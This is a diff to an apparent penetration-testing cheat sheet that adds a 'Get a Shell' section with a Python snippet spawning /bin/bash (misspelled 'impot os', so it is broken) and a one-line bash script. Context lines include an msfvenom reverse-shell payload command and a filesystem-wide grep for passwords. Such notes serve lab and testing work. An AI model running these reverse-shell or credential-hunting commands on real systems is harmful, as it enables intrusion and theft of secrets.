@@ -62,6 +62,24 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > /path/to/
 
 ---
 
+## Get a Shell
+
+### Bash With Python
+
+```python
+impot os
+os.system("/bin/bash")
+```
+
+## Bash With Bash
+
+```bash
+#!/bin/bash
+/bin/bash
+```
+
+---
+
 ## Shell Stabilization
 
 ### Using script utility
@@ -104,4 +122,5 @@ grep -Ri "password" / 2>/dev/null
 ```
 
 ---
+
 
